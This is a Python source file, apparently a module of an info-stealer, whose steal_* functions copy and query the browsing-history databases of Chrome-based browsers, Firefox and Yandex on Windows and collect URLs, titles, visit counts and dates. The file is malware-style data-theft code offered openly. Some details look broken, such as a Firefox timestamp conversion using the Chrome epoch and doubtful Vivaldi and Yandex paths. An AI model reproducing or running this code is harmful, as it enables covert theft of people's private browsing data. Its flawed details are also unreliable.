import os
import json
import sqlite3
import shutil
from datetime import datetime, timedelta

def my_chrome_datetime(time_in_mseconds):
    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

def steal_chrome_based_history(browser):
    history_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                   browser, "User Data", "Default", "History")
    if not os.path.exists(history_db_path):
        print(f"File not found: {history_db_path}")
        return {}
    
    try:
        shutil.copyfile(history_db_path, "my_chrome_history.db")
        db = sqlite3.connect("my_chrome_history.db")
        cursor = db.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
        data = {}
        for row in cursor.fetchall():
            url = row[0]
            title = row[1]
            visit_count = row[2]
            last_visit_time = my_chrome_datetime(row[3])
            data[url] = {
                "title": title,
                "visit_count": visit_count,
                "last_visit_time": str(last_visit_time)
            }
        cursor.close()
        db.close()
        os.remove("my_chrome_history.db")
        return data
    except Exception as e:
        print(f"Error stealing history from {browser}: {e}")
        return {}

def steal_firefox_history():
    firefox_profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    profiles = [f for f in os.listdir(firefox_profile_path) if f.endswith('.default-release')]
    if not profiles:
        print("No Firefox profiles found.")
        return {}
    
    profile_path = os.path.join(firefox_profile_path, profiles[0])
    history_path = os.path.join(profile_path, "places.sqlite")
    
    if not os.path.exists(history_path):
        print("Firefox history database not found.")
        return {}
    
    try:
        shutil.copyfile(history_path, "my_firefox_history.sqlite")
        db = sqlite3.connect("my_firefox_history.sqlite")
        cursor = db.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places")
        data = {}
        for row in cursor.fetchall():
            url = row[0]
            title = row[1]
            visit_count = row[2]
            last_visit_date = my_chrome_datetime(row[3] / 1000)  
            data[url] = {
                "title": title,
                "visit_count": visit_count,
                "last_visit_date": str(last_visit_date)
            }
        cursor.close()
        db.close()
        os.remove("my_firefox_history.sqlite")
        return data
    except Exception as e:
        print(f"Error stealing Firefox history: {e}")
        return {}

def steal_yandex_history():
    yandex_profile_path = os.path.join(os.environ["APPDATA"], "Yandex", "YandexBrowser", "User Data", "Default")
    history_path = os.path.join(yandex_profile_path, "History", "history.json")
    
    if not os.path.exists(history_path):
        print("Yandex history file not found.")
        return {}
    
    try:
        with open(history_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data
    except Exception as e:
        print(f"Error stealing Yandex history: {e}")
        return {}
    

def steal_history():
    data = {}
    browsers = {
        "chrome": "Google\\Chrome",
        "brave": "BraveSoftware\\Brave-Browser",
        "opera": "Opera Software\\Opera Stable",
        "operagx": "Opera Software\\Opera GX Stable",
        "edge": "Microsoft\\Edge",
        "vivaldi": "Vivaldi\\User Data",
        "yandex": "Yandex\\YandexBrowser"
    }
    
    for browser_name, browser_path in browsers.items():
        try:
            browser_data = steal_chrome_based_history(browser_path)
            if browser_data:
                data[browser_name] = browser_data
        except Exception as e:
            print(f"Error obtaining {browser_name} history: {e}")
    
    try:
        yandex_data = steal_yandex_history()
        if yandex_data:
            data["yandex"] = yandex_data
    except Exception as e:
        print(f"Error obtaining Yandex history: {e}")
    try:
        firefox_data = steal_firefox_history()
        if firefox_data:
            data["firefox"] = firefox_data
    except Exception as e:
        print(f"Error obtaining Firefox history: {e}")

    if data:
        print("History obtained successfully.")
    else:

        print("No history found.")
    
    return data